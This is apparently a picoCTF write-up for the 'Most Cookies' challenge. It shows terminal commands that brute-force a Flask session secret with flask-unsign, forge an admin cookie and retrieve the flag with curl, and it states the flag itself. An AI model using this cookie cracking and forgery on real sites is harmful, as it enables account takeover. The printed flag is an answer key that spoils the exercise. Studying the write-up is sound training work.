### Most Cookies
### Description 

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)
### Hint

- Have you heard of JWT?
- What is that cookie?

## Solución  1
```
root@LAPTOP-05MLJNS4:/home/octaviio/hack# flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-9NkA.iMbLJa6taepGz7zQEKApqCOrLi4" --wordlist Cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 21 attempts
'gingersnap'

root@LAPTOP-05MLJNS4:/home/octaviio/hack# flask-unsign --sign --cookie  "{'very_auth':'admin'}" --secret "gingersnap"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9UhQ.ZkFZG6S0boVZKarSQE4Jgqgl9RY

root@LAPTOP-05MLJNS4:/home/octaviio/hack# curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9UhQ.ZkFZG6S0boVZKarSQE4Jgqgl9RY"

	--dentro del html
	  <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_5f016958}</code></p>
        </div>


picoCTF{pwn_4ll_th3_cook1E5_5f016958}

```